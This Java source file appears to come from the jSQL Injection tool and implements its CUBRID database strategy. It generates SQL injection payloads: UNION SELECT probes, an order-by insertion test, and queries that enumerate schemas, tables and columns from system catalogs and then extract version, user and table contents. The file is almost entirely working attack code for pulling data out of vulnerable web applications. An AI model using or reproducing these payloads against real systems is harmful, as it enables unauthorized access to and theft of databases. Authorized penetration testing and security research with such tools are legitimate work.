package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.blind.ConcreteTimeInjection;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class CubridStrategy extends ASQLStrategy {

    @Override
    public String getSchemaInfos() {
        return 
            "concat(" +
                "" +
                    "concat_ws(" +
                        "'{%}'," +
                        "version()," +
                        "database()," +
                        "user()," +
                        "CURRENT_USER" +
                    ")" +
                "" +
                "," +
                "'%01%03%03%07'" +
            ")";
    }

    @Override
    public String getSchemaList() {
        return 
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "r||" +
                        "'%05'||" +
                        "cast(q+as+varchar)||" +
                        "'%04'" +
                        "+order+by+1+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")" +
            "from(" +
                "select+" +
                    "cast(owner_name+as+varchar)r," +
                    "count(class_name)q+" +
                "from+" +
                    "db_class+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String getTableList(Database database) {
        return 
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "cast(r+as+varchar)||" +
                        "'%050%04'+" +
                        "order+by+1+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")" +
            "from(" +
                "select+" +
                    "class_name+r+" +
                "from+" +
                    "db_class+" +
                "where+" +
                    "owner_name='" + database + "'+" +
                "order+by+r{limit}" +
            ")x";
    }

    @Override
    public String getColumnList(Table table) {
        return 
            "select+" +
                "concat(" +
                    "group_concat(" +
                        "'%04'||" +
                        "cast(n+as+varchar)||" +
                        "'%05'||" +
                        "0||" +
                        "'%04'+" +
                        "order+by+1+" +
                        "separator+'%06'" +
                    ")," +
                    "'%01%03%03%07'" +
                ")" +
            "from(" +
                "select+" +
                    "attr_name+n+" +
                "from+" +
                    "db_attribute+c+inner+join+db_class+t+on+t.class_name=c.class_name+" +
                "where+" +
                    "t.owner_name='" + table.getParent() + "'+" +
                    "and+" +
                    "t.class_name='" + table + "'+" +
                "order+by+n{limit}" +
            ")x";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, "{%}");
        
        // 7f caractère d'effacement, dernier code hexa supporté par mysql, donne 3f=>? à partir de 80
        formatListColumn = formatListColumn.replace("{%}", "`,'')),'%7f',trim(ifnull(`");
        
        formatListColumn = "trim(ifnull(`" + formatListColumn + "`,''))";
        
        return 
            "select+concat(" +
                "group_concat(" +
                    "'%04'||" +
                    "r||" +
                    "'%05'||" +
                    "cast(q+as+varchar)||" +
                    "'%04'" +
                    "+order+by+1+separator+'%06'" +
                ")," +
                "'%01%03%03%07'" +
            ")from(" +
                "select+" +
                    "cast(concat(" + formatListColumn + ")as+varchar)r," +
                    "count(*)q+" +
                "from+" +
                    "`" + database + "`.`" + table + "`+" +
                "group+by+r{limit}" +
            ")x";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return 
        "(" +
            "select+" +
                /**
                 * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
                 */
                "concat(" +
                    "'SQLi'," +
                    "substr(" +
                        "(" + sqlQuery + ")," +
                        startPosition + "," +
                        /**
                         * Minus 'SQLi' should apply
                         */
                        MediatorModel.model().performanceLength +
                    ")" +
                ")" +
        ")";
    }

    @Override
    public String performanceQuery(String[] indexes) {
        return 
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "(select+concat('SQLi',$1,repeat('%23',65536),'%01%03%03%07iLQS'))"
            );
    }

    @Override
    public String initialQuery(Integer nbFields) {
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("''||1337"+ i +"7330%2b1");
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "--+";
    }

    @Override
    public String insertionCharacterQuery() {
        return "+order+by+1337--+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "+limit+" + limitSQLResult + ",65536";
    }

    @Override
    public String getDbLabel() {
        return "CUBRID";
    }
}